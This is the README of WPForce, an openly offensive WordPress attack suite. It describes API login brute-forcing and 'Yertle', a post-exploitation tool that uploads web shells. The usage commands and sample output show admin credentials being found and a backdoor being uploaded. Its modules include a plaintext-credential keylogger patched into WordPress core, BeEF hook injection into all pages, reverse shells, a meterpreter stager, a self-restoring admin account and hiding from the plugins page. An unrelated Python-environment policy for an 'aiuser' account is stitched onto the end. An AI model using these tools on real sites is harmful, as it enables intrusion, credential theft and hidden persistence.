<!-- Copyrights to Andrea Bodei 2026-2036 www.andreabodei.com -->
![Supported Python versions](https://img.shields.io/badge/python-2.7-blue.svg)
# WPForce - Wordpress Attack Suite 

## ABOUT:
WPForce is a suite of Wordpress Attack tools.  Currently this contains 2 scripts - WPForce, which brute forces logins via the API, and Yertle, which uploads shells once admin credentials have been found.  Yertle also contains a number of post exploitation modules.

For more information, visit the blog post here: 
https://www.n00py.io/2017/03/squeezing-the-juice-out-of-a-compromised-wordpress-server/

Blogs in other languages: 

Chinese -    www.mottoin.com/100381.html 

Portuguese - http://www.100security.com.br/wpforce/ 

Spanish -    http://www.1024megas.com/2017/05/wpforce-fuerzabruta-postexplotacion.html 
             
   https://esgeeks.com/como-hackear-sitio-wordpress-con-wpforce/

Russian -    https://hackware.ru/?p=2547

French -     https://securityhack3r.info/wpforce-brute-force-attack-tool-wordpress/ 

Turkish -    http://turkhackteam.org/web-server-guvenligi/1655005-wordpress-site-sizma-testi-part-1-a.html


## FEATURES:
* Brute Force via API, not login form bypassing some forms of protection
* Can automatically upload an interactive shell
* Can be used to spawn a full featured reverse shell
* Dumps WordPress password hashes
* Can backdoor authentication function for plaintext password collection
* Inject BeEF hook into all pages
* Pivot to meterpreter if needed


## INSTALL:
```
Yertle requires the requests libary to run.
http://docs.python-requests.org/en/master/user/install/
```

## USAGE:
```
python wpforce.py -i usr.txt -w pass.txt -u "http://www.[website].com"

   ,-~~-.___.       __        __ ____   _____
  / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
 (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
  \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
     ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
    /  \-'~;   ||     |
   /  __/~| ...||__/|-"   Brute Force Attack Tool for Wordpress
 =(  _____||________|                 ~n00py~

Username List: usr.txt (3)
Password List: pass.txt (21)
URL: http://www[website].com
--------------------------
[xxxxxxxxxxxxx@gmail.com : xxxxxxxxxxxxx] are valid credentials!  - THIS ACCOUNT IS ADMIN
--------------------------
--------------------------
[xxxxxxxxxxxxx@icloud.com : xxxxxxxxxxxx] are valid credentials!
--------------------------
 100% Percent Complete
All correct pairs:
{'xxxxxxxxxxxxx@icloud.com': 'xxxxxxxxxxxxx', 'xxxxxxxxxxxxx@gmail.com': 'xxxxxxxxxxxxx'}

 -h, --help            show this help message and exit
  -i INPUT, --input INPUT
                        Input file name
  -w WORDLIST, --wordlist WORDLIST
                        Wordlist file name
  -u URL, --url URL     URL of target
  -v, --verbose         Verbose output. Show the attemps as they happen.
  -t THREADS, --threads THREADS
                        Determines the number of threads to be used, default
                        is 10
  -a AGENT, --agent AGENT
                        Determines the user-agent
  -d, --debug           This option is used for determining issues with the
                        script.


python yertle.py -u "[username]" -p "[password]" -t "http://www.[website].com" -i
     _..---.--.    __   __        _   _
   .'\ __|/O.__)   \ \ / /__ _ __| |_| | ___
  /__.' _/ .-'_\    \ V / _ \ '__| __| |/ _ \.
 (____.'.-_\____)    | |  __/ |  | |_| |  __/
  (_/ _)__(_ \_)\_   |_|\___|_|   \__|_|\___|
   (_..)--(.._)'--'         ~n00py~
      Post-exploitation Module for Wordpress

Backdoor uploaded!
Upload Directory: ebwhbas
os-shell>



  -h, --help            show this help message and exit
  -i, --interactive     Interactive command shell
  -r, --reverse         Reverse Shell
  -t TARGET, --target TARGET
                        URL of target
  -u USERNAME, --username USERNAME
                        Admin username
  -p PASSWORD, --password PASSWORD
                        Admin password
  -li IP, --ip IP       Listener IP
  -lp PORT, --port PORT
                        Listener Port
  -v, --verbose         Verbose output.
  -e EXISTING, --existing EXISTING
                        Skips uploading a shell, and connects to existing
                        shell


```

Yertle currently contains these modules:

```
Core Commands
=============
 
Command                   Description
-------                   -----------
?                         Help menu
beef                      Injects a BeEF hook into website
dbcreds                   Prints the database credentials
exit                      Terminate the session
hashdump                  Dumps all WordPress password hashes
help                      Help menu
keylogger                 Patches WordPress core to log plaintext credentials
keylog                    Displays keylog file
meterpreter               Executes a PHP meterpreter stager to connect to metasploit
persist                   Creates an admin account that will re-add itself
quit                      Terminate the session
shell                     Sends a TCP reverse shell to a netcat listener
stealth                   Hides Yertle from the plugins page
```

<!-- VANTAGE-PYTHON-ENV-STANDARD:START -->
## VANTAGE Python environment standard

Every managed host-side VANTAGE Python command uses the fixed passwd account
`aiuser` and its single shared environment at `/home/aiuser/.venv`. It never
uses the caller or root account's `HOME`, an activated environment, a project-local
environment, bare `pip` or `pip3`, or `pip --user`.

From any account, use the workspace dispatcher; it resolves `aiuser` through the
passwd database, constructs `<aiuser-home>/.venv`, and switches identity before
creating the environment, installing a package, or running Python:

```text
/home/spabam/Dropbox/Public/VANTAGE/VAPT/python-env.sh ensure
/home/spabam/Dropbox/Public/VANTAGE/VAPT/python-env.sh install path/to/requirements.txt
/home/spabam/Dropbox/Public/VANTAGE/VAPT/python-env.sh python path/to/script.py
/home/spabam/Dropbox/Public/VANTAGE/VAPT/python-env.sh pip check
```

Pip is always interpreter-bound (`/home/aiuser/.venv/bin/python -m pip`). Managed
project installers and launchers apply the same identity transition automatically.
Before a managed installation starts, its `installer.sh` checks the system passwd
database; if `aiuser` is absent, the canonical privileged runtime helper creates
and validates the account. Help, dry-run, and read-only inspection modes never
create it. Runtime tools never install or repair packages; provision dependencies
first. Any contradictory upstream setup command elsewhere in this file is
reference-only in this integration—use the VANTAGE installer or launcher instead. A container, OS-managed
service, or dependency-incompatible upstream application may use a separate
environment only under `aiuser` (or inside its isolated filesystem) and only
when its component documentation explicitly says so.
<!-- VANTAGE-PYTHON-ENV-STANDARD:END -->
<!-- Copyrights to Andrea Bodei 2026-2036 www.andreabodei.com -->
